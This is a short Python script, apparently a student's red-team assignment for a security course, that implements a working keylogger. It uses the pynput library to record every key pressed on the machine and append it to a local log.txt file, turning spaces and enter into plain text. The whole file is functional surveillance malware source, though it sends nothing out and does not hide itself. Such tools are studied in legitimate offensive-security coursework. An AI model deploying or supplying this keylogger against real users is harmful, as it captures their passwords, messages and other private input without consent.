"""
Grace Lombardi
CSEC 473
Red Team Tool
4/10/2021
"""
from pynput.keyboard import Listener


def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'

    with open("log.txt", 'a') as f:
        f.write(key)


def main():
    with Listener(on_press=log_keystroke) as l:
        l.join()


main()
